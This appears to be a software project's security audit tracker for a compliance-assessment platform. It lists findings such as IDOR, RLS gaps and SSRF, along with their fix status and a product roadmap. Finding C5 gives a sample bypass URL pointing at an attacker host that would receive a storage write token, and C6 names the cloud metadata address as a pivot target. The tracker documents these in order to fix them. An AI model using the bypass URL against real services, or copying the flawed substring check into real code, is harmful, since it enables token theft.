# FrostGate Security & Integrity Audit Tracker

**Audited:** `main` at `d15699e7`  
**Opened:** 2026-06-02  
**Authority:** All items from forensic audit + user-specified ROI enhancements + moat builders.  
Nothing in this file can be closed without a PR reference and explicit review.

---

## Critical Findings

| # | Finding | Location | Status | PR |
|---|---------|----------|--------|----|
| C1 | **QA approval bypasses readiness gates** — `qa_approve_report` directly sets `delivered` without running `_evaluate_execution_state`. Missing scans, questionnaires, evidence links, and remediation can ship as complete. | `api/field_assessment.py:4877` vs `:1179` | ✅ Fixed | — |
| C2 | **Fresh Postgres deployments can fail** — startup runs migrations before `create_all()`, while migrations 0073 and 0074 alter FA tables that have no earlier create migration. | `api/db.py:1344`, `migrations/postgres/0073` | ✅ Fixed | — |
| C3 | **FA tenant tables lack Postgres RLS** — questionnaires and governance promotions have no DB-level row security. Application filters present but not enforced at DB layer. | `api/db_migrations.py:137`, `migrations/postgres/0067` | ✅ Fixed | — |
| C4 | **Portal IDOR — client-wide not engagement-scoped** — BFF appends `client_access_code` as query param but item endpoints scope only on `(engagement_id, tenant_id)`. A client with another engagement UUID can read or mutate data. | `apps/portal/app/api/core/[...path]/route.ts:110`, `api/field_assessment.py:1031,1944` | ✅ Fixed | — |
| C5 | **Audio proxy SSRF / bearer token exfiltration** — proxy accepts user-controlled URL, checks `url.includes(".blob.vercel-storage.com")` (substring, not hostname), then fetches with `Authorization: Bearer ${BLOB_READ_WRITE_TOKEN}`. URL like `https://attacker.com?x=.blob.vercel-storage.com` passes the check and receives the write token. | `apps/console/app/api/field-assessment/audio-url/route.ts:23-35` | ✅ Fixed | PR 43 — artifact-registry refactor: client never submits blob URLs; `artifact_id` resolved to `storage_key` server-side from trusted backend DB; `issueSignedToken`+`presignUrl` for short-lived signed URL; no bearer token in fetch; 22 static-analysis tests prove SSRF structurally impossible |
| C6 | **Outbound scanners permit network pivoting** — network scanner accepts arbitrary IPs, CIDRs, and hostnames and opens sockets to admin/data-store ports. Web-header scanner accepts arbitrary URLs and follows redirects. Neither path blocks loopback, private, link-local, cloud metadata (`169.254.169.254`), or DNS-rebinding targets. | `api/field_assessment.py:3267-3379`, `services/connectors/network_scan/runner.py:84-99`, `services/connectors/web_headers/runner.py:193-203` | ✅ Fixed | PR fix 44 — `SafeTargetValidationService` centralizes 12-layer validation (RFC1918+IPv6+metadata+DNS-rebinding+CIDR+redirect revalidation); durable scan jobs; append-only audit trail; rate limiting; 114 security tests green |
| C7 | **Portal capability model not suitable for client isolation** — `client_access_code` stored and returned in plaintext, sent as query parameter (leaks to logs/analytics/referrers/browser history), reused across engagements by `client_name` match, enforced only when caller supplies `X-Portal-Source: client-portal`. C4 fixed IDOR at endpoint level; credential model gap remains. | `api/field_assessment.py:761-784,5070-5087`, `api/middleware/portal_scope.py:35-75` | ✅ Fixed | PR fix 45 — portal grant model hardening: Argon2id-hashed per-engagement grants, server-side sessions (`X-FG-Portal-Session` header), append-only audit trail, middleware rewritten to validate session+engagement binding per request; 46 security tests; 15 mandatory security layers implemented |

---

## High Findings

| # | Finding | Location | Status | PR |
|---|---------|----------|--------|----|
| H5 | **Audit events not immutable** — `fa_engagement_audit_events` claims append-only semantics in code but no Postgres trigger enforces it; table absent from RLS startup assertion. | `api/db_models_field_assessment.py:12` | ✅ Fixed | — |
| H6 | **Audio uploaded as public blob, sent to hardcoded OpenAI** — sensitive regulated-industry recordings bypass platform provider-governance path. Blob exposure fixed (private + auth-gated proxy). OpenAI provider governance deferred to P1 Private Interview Vault (requires PR 21 provider abstraction). | `apps/console/app/api/field-assessment/transcribe/route.ts:109,128` | ⏸ Deferred | — |
| H7 | **`evidence_doc_id` accepts arbitrary values** — `patch_questionnaire_response` does not verify the document belongs to the same engagement/tenant. Stale `finding → document_analysis` auto-links not cleaned when response status drops. | `api/field_assessment.py:6274` | ✅ Fixed | — |
| H8 | **Observation delete leaves dangling evidence links** — cascade removes source links but not target links (common remediation path). Source link delete also missing `engagement_id` predicate. | `api/field_assessment.py:1827` | ✅ Fixed | — |
| H9 | **Observation edits bypass audio-evidence validator** — structured evidence and linked finding IDs replaceable without validation; audit diff omits both fields. | `api/field_assessment.py:1729` | ✅ Fixed | — |
| H10 | **QA approval is mutable** — re-approving overwrites reviewer metadata instead of rejecting changes to the legal artifact. Response returns JWT actor instead of reviewer display name. | `api/field_assessment.py:4850` | ✅ Fixed | — |
| H11 | **Drift tables outside Postgres RLS** — `fa_drift_baselines`, `fa_drift_alerts`, and `fa_connector_schedules` omitted from migration 0075 and the startup RLS assertion. Application queries include tenant predicates but DB-level enforcement is incomplete. | `api/db_models_drift.py:17-114`, `migrations/postgres/0075_fa_rls.sql:20-32` | 🔴 Open | — |
| H12 | **Scan jobs non-durable, run IDs unbound to tenant+engagement** — all connector jobs share an in-memory `_MSGRAPH_RUNS` dict and FastAPI background tasks. Restart loses status; replicas disagree; no durable lease, heartbeat, or dead-letter path. Status route verifies engagement but does not verify `run_id` belongs to that tenant+engagement. | `api/field_assessment.py:172-173,2940-2959,4079-4104` | 🔴 Open | — |
| H13 | **Audit event not in transaction with mutation** — report creation commits the report row, then appends the audit event in a separate operation. If the append fails, evidence exists with no audit trail. Several other mutation paths (metadata updates, schedule upserts, remediation-hint edits) also omit FA audit events entirely. | `api/field_assessment.py:1092-1119,2227-2264,4689-4749,5735-5751` | ✅ Fixed | PR fix 46 — `AuditAtomicityService` abstraction; report creation split-commit fixed; audit events added to patch_engagement, patch_finding_remediation, portal_grant create/revoke/rotate; `transaction_id`/`before_hash`/`after_hash`/`entity_type`/`entity_id`/`actor_type` columns; migration 0082; 33-test suite |
| H14 | **Console RBAC coarse, actor attribution lost** — any authenticated console user can reach all FA routes via the BFF prefix. BFF forwards a shared core API key, so backend audit actors resolve to the service key rather than the human operator. Sensitive operations (scan authorization, evidence deletion, baseline pinning, promotion, QA approval) all share `governance:write`. | `apps/console/middleware.ts:8-32`, `apps/console/app/api/core/[...path]/route.ts:62-66,181-216` | 🔴 Open | — |
| H15 | **Evidence immutability partial** — new evidence ingestion is blocked after terminal engagement states (PI16 fix), but observation PATCH/DELETE and questionnaire evidence-link changes do not apply the same lifecycle guard. Finalized reports rely on application behavior only; no database trigger enforces report immutability after QA approval. | `api/field_assessment.py:224-233,1814-1969,6441-6645` | 🔴 Open | — |

---

## Product Integrity Findings

| # | Finding | Location | Status | PR |
|---|---------|----------|--------|----|
| PI11 | **MS Graph import bypasses governance promotion lock** — auto-promotes governance assets and rebuilds graph before delivery, violating the locked rule. Errors silently swallowed. | `services/field_assessment/connectors/msgraph_bridge.py:239` | ✅ Fixed | — |
| PI12 | **Corpus feed unfinished** — architecture promises async document ingestion; implementation synchronously indexes finding summaries only. | `services/field_assessment/promotion.py:324` | ✅ Fixed | — |
| PI13 | **Readiness evaluation silently caps at 100** — scans, docs, observations, findings, and links all capped; promotion creates workflows for only first 100 findings. Larger assessments partially evaluated. | `api/field_assessment.py:2377`, `services/field_assessment/promotion.py:152` | ✅ Fixed | — |
| PI14 | **Soft-deleted observations counted in summary** — `engagement_summary` count query does not filter `deleted_at IS NULL`. | `api/field_assessment.py:2308` | ✅ Fixed | — |
| PI15 | **Postgres schema evolution incomplete** — ORM fields (`finding_count`, `asset_id`) have no FA migration; `create_all(checkfirst=True)` does not add missing columns on existing tables. | `api/db_models_field_assessment.py:87` | ✅ Fixed | — |
| PI16 | **Terminal FA engagements accepted new evidence mutations** — scan ingest, document registration, observation capture, and evidence-link creation did not consistently reject delivered/cancelled/closed engagements. Public list routes also omitted store-supported offsets, preventing complete stable pagination checks. | `api/field_assessment.py`, `services/field_assessment/store.py` | ✅ Fixed | — |
| PI17 | **GET drift-report mutates state** — `GET /drift-report` emits alert rows by default. Reads are not repeatable or side-effect-free; problematic behind caches, retries, and monitoring probes. | `api/field_assessment.py:4450-4456,4611-4620` | 🔴 Open | — |
| PI18 | **UI/API TypeScript contract drift** — scan-source union omits several connectors; finding statuses use `accepted_risk`/`closed` while backend accepts `accepted`/`false_positive`; finding list expects `total`+`next_cursor` but API returns `total_count`; generic BFF helper always parses JSON so `204` deletes surface as client errors. | `apps/console/lib/fieldAssessmentApi.ts:40-48,76,181-185`, `api/field_assessment.py:537-542` | 🔴 Open | — |
| PI19 | **Connector scheduler is registry only, not executor** — `fa_connector_schedules` stores schedule records but no worker executes them. Source-type allowlist is not enforced. Features are presented as automation but are configuration storage only. | `services/connectors/drift/scheduler.py:1-39` | 🔴 Open | — |
| PI20 | **FA/Governance coupling prevents independent deployment** — `promotion.py` directly creates governance workflows, assets, RAG corpus entries, and timeline events during delivery. `msgraph_bridge.py` writes governance report rows and triggers graph rebuilds before delivery. FA delivery currently requires Autonomous Governance to be present and writable. | `services/field_assessment/promotion.py`, `services/field_assessment/connectors/msgraph_bridge.py`, `services/field_assessment/timeline.py` | 🔴 Open | — |

---

## ROI Enhancements

| Priority | Enhancement | Rationale | Status | PR |
|----------|-------------|-----------|--------|----|
| P0 | **One-click defensible delivery gate** | Prevent report delivery until evidence, questionnaire, QA, and promotion checks pass. Reduces manual QA risk. | ✅ Done | C1 fix |
| P0 | **Client-scoped portal permissions** | Replace shared tenant-wide portal access with explicit per-client + per-engagement grants. Enables secure multi-client scaling. C4 IDOR fixed; C7 credential model (plaintext codes, query-string delivery, name-reuse) tracked separately. | 🟡 Partial | C4 fix |
| P1 | **Evidence Provenance Ledger** | Machine-readable provenance record per evidence item: collection method, collector, timestamp, content hash, classification, retention policy, chain status, verification status. Foundational for regulatory audit trail and future autonomous governance. | 🔴 Open | — |
| P1 | **Assessment health dashboard** | Operator view: missing evidence, stale docs, failed scans, unresolved blockers, promotion state. Reduces delivery time. | 🔴 Open | — |
| P1 | **Evidence integrity score** | Score every finding by source quality, freshness, corroboration, chain completeness. Makes reports more credible. | 🔴 Open | — |
| P1 | **Private interview vault** | Signed URLs, retention controls, consent records, redaction, transcript provenance. Required for healthcare, legal, government sales. Closes H6. | 🔴 Open | — |
| P1 | **Spreadsheet + competitor import adapters** | Import controls, findings, evidence, remediation from CSV and common GRC exports. Lowers switching cost. | 🔴 Open | — |
| P2 | **Reassessment cloning** | Clone scope, interview plan, documents, owners, unresolved findings into a new engagement. Improves recurring revenue. | 🔴 Open | — |
| P2 | **Assessor workflow automation** | Auto-generate interview agenda, evidence request list, next-best action, report completion forecast. Improves margin. | 🔴 Open | — |
| P2 | **Client remediation workspace** | Owners, due dates, evidence upload, reviewer approval, reminders, closure verification. Converts one-time assessments into subscriptions. | 🔴 Open | — |
| P2 | **Framework expansion engine** | Reuse one evidence item across NIST AI RMF, HIPAA, SOC 2, ISO 27001, CMMC, PCI DSS, DORA, FedRAMP, NIST 800-171. Expands addressable market. | 🔴 Open | — |

---

## Moat Builders

| Priority | Moat | Why hard to copy | Status | PR |
|----------|------|------------------|--------|----|
| M0 | **Autonomous Trust Fabric** | Evidence Confidence Engine: tracks evidence freshness, source reliability, corroboration count, and remediation success history. Aggregates into Evidence → Control → Finding → Assessment → Organization confidence hierarchy. Operationalizes "Trust but Verify" — makes FrostGate reports machine-trustable for future autonomous governance agents. | 🔴 Not started | — |
| M1 | **Longitudinal evidence graph** | Preserve verified relationships across assets, interviews, scans, documents, controls, findings, remediation, and drift across engagements. Value compounds with every reassessment. | 🔴 Not started | — |
| M1 | **Sector benchmark network** | Anonymized benchmarks by sector, org size, control maturity, remediation velocity. New customers get better insights as dataset grows. | 🔴 Not started | — |
| M1 | **Evidence-backed remediation intelligence** | Learn which fixes actually close findings, reduce drift, improve readiness. Recommend from observed outcomes, not generic checklists. | 🔴 Not started | — |
| M1 | **Continuous reassessment triggers** | Detect drift from MS Graph, identity, OAuth, endpoint, DNS, web, network; automatically recommend focused reassessment. Creates retention. | 🔴 Not started | — |
| M2 | **Defensible report verification** | Signed reports, immutable evidence chains, replayable snapshots, clause-level citations, reviewer history. Strong differentiator in regulated sales. Requires H5 fix first. | 🔴 Not started | — |
| M2 | **Control crosswalk knowledge graph** | Map one verified artifact to multiple regulatory clauses, show exactly why it satisfies each. Reduces audit labor over time. | 🔴 Not started | — |
| M2 | **Assessment playbook marketplace** | Versioned sector playbooks with evidence requirements, interview guides, scan recipes. Supports partner assessors without diluting methodology. | 🔴 Not started | — |
| M3 | **Remediation outcome dataset** | Track time-to-close, cost, confidence gain, control improvement, recurrence rate. Supports premium benchmarking and advisory products. | 🔴 Not started | — |

---

## Status key

| Symbol | Meaning |
|--------|---------|
| 🔴 Open | Identified, not yet started |
| 🟡 In progress | Work under way, PR not yet merged |
| ✅ Fixed | PR merged; finding resolved |
| ⏸ Deferred | Accepted risk, documented reason |

---

*Last updated: 2026-06-03 (v1.5) — H13.5 implemented (PR fix 47): AuditCoverageValidator CI gate — AST-based validator auto-discovers all 38 mutation routes, checks for direct audit calls, validates against `tools/ci/audit_exceptions.yaml` (14 bootstrap exceptions, all expiring 2026-09-01), generates `artifacts/audit_coverage_report.json`; `make audit-coverage-check` now mandatory in `fg-fast`; 25-test security suite; 100% route coverage. Previously (v1.4) — H13 fixed (PR fix 46): AuditAtomicityService + transaction correlation columns (migration 0082); report creation split-commit fixed; audit events added to 5 previously-unaudited mutation paths; 33-test suite. Previously (v1.3) — C7 fixed (PR fix 45): portal grant model hardening — Argon2id-hashed grants, server-side sessions, engagement-binding per request, 46-test security suite, middleware rewritten. Previously (v1.2): C5 fixed (PR 43): artifact-registry audio proxy refactor — raw URL input attack surface eliminated, SSRF structurally impossible, fa_artifacts table + RLS, issueSignedToken+presignUrl signed URLs, 22 static-analysis tests. Previously (v1.1): ENTERPRISE_PLAN.md revised: Phase 0 split into 0A (Revenue-Safe: C5/C6/C7/H13/H15) and 0B (Multi-Tenant Safety: H14/H11/H12/PI20). H14 and PI20 elevated from Phase 1 to Phase 0B (human actor attribution is foundational for regulated environments; FA/Governance decoupling enables revenue diversification). Added M0 Autonomous Trust Fabric (Evidence Confidence Engine) as new moat layer preceding M1. Added Evidence Provenance Ledger as P1 ROI Enhancement (foundational for autonomous governance trustability). Phase 3 renamed Compounding Moat. Phase 4 expanded with CMMC and government expansion. Previously: Codex forensic audit added C5/C6/C7 and H11–H15 and PI17–PI20. 15-module SQLite FA forensic regression suite; PI16 fixed; H7, H8, PI14 fixed; C4 fixed; C1 fixed; C2 fixed; C3 fixed (migration 0075); H5 fixed (migration 0076); H9 fixed; H10 fixed; PI15 fixed (migration 0077); PI13 fixed; PI11 fixed; PI12 fixed; H6 partially closed.*
